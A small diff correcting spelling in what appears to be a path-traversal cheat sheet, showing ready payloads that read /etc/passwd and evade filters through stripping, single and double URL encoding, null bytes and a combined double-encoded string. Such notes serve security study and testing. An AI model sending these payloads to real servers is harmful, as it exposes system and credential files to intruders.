@@ -17,10 +17,10 @@ An attacker can request the following URL to retrieve the `/etc/passwd` file fro
 
 `https://insecure-website.com/loadImage?filename=../../../etc/passwd`
 
-## Bypass defences
+## Bypass defenses
 
 * Elimination (strip): `../` -> `....//`
-  * Test: try to change the orginal request `GET /image?filename=1.jpg` to `GET /image?filename=../1.jpg`
+  * Test: try to change the original request `GET /image?filename=1.jpg` to `GET /image?filename=../1.jpg`
   * If the file is loaded the code strip `../`
 * Encode: `../` ->`%2e%2e%2f`
 * Double-encode: `../` ->`%252e%252e%252f`
@@ -39,7 +39,7 @@ An attacker can request the following URL to retrieve the `/etc/passwd` file fro
     * Try to add null byte: `GET /image?filename=/etc/passwd%00`
     * Try to add null byte and extension: `GET /image?filename=/etc/passwd%00.png`
 * Combine the cases:
-  * Example: `....//....//....//etc/passwd%00.jpg` (strip, double-encode, null byte, whitelist exstension)
+  * Example: `....//....//....//etc/passwd%00.jpg` (strip, double-encode, null byte, whitelist extension)
   * `%252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252Fetc%252Fpasswd%252500%252Ejpg`
 
 ## Automatic exploitation
